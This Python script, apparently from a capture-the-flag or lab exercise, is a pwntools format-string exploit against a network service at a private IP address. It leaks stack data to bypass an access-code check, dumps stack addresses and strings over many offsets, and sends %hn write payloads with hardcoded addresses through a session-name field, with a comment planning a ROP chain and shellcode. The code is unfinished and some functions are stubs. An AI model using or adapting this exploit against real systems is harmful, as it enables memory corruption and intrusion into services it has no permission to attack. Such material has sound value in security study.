'''
Attack plan:
Find an address on the stack that points to a string we can overwrite
We'll assume NX - Build ROP chain to make a region of memory/stack executable and then write our shellcode there
If we could find address of system then this would be easier

'''

import struct, telnetlib, os
from pwn import *
from libformatstr import *

r = remote('192.168.85.222', 1337)

def accessCode():
    r.recvuntil("ACCESS CODE: ")
    r.send("%3$p" + '\n')
    r.recvuntil('INVALID ACCESS CODE: 0x')
    code = int(r.recvuntil('\n')[:-1], 16)
    r.send(str(code) + '\n')  

def printAddresses():
    # String payload
    q = "%" + "%i$s\n" % n
    # Process addresses
    v = "%" + "%i$p\n" % n
    r.recvuntil('ENTER COMMAND: ')
    r.send("3" + '\n')
    r.recvuntil('ENTER NEW SESSION NAME: ')
    r.send(v + '\n')
    r.recvuntil('SESSION: ')
    addr = r.recvuntil('\n')[:-1]
    print "[%i] " % n + addr
    # Loop to check if addresses are valid and then dump their strings
    
    if '0xb' in addr:
        if len(addr) == 10:
            r.recvuntil('ENTER COMMAND: ')
            r.send("3" + '\n')
            r.recvuntil('ENTER NEW SESSION NAME: ')
            r.send(q + '\n')
            r.recvuntil('SESSION: ')
            t = r.recvuntil('\n')[:-1]
            sessionName()
            print "[%i] " % n + addr + '\t' + '[' + t + ']'
   

def sessionName():
    n = '%16705c%173$hnAAA'
    #n = '$173%p_%08x.%08x.%08x.%08x.%08x.%08x.%n'
    #n = '%64u%173$n'
    #n = '%400\x41\x41%4$hn\x41\x41%5$n'
    #n = '\xec\x66\x89\xbf%16691x%x%x%8x%141$hn%142$hn'
    n1 = '\xab\x32\x69\xb7'
    n2 = '\xc0\xda\x7c\xb7'
    n3 = '\x54\xdb\x7c\xb7'
    n4 = '\x07\xdb\x7c\xb7'
    n5 = '\x41\x41x\41\x41'
    junk = 'JUNK'
    t = fs('')
    r.recvuntil('ENTER COMMAND: ')
    r.send("3" + '\n')
    r.recvuntil('ENTER NEW SESSION NAME: ')
    #r.send(n1 + junk + n2 + junk + n3 + junk + n4 + '%x%x%126x%n')
    r.send(n)
    r.recvuntil('SESSION: ')
    
def writeByte():
    # Overwrite a byte from %184$s = REMOTE_HOST=192.168.0.1 address is 0xbf837fc9
    # Math is hard:    
    print "[*] Overwriting a byte at offset 184..."
    #sessionName()
    #sessionName()
    #r.send("%1337x%184$hn" + '\n')
    #sessionName()
    #r.send("%184$s")

def fs(fss):
    fss = ''
    fss += '%.56816u'
    fss += '%7$hn'
    fss += '%.65406u'
    fss += '%11$hn'
    fss += '%.593u'
    fss += '%7$hn'

    return fss




accessCode()
for n in range (1,240):
    printAddresses()
sessionName()
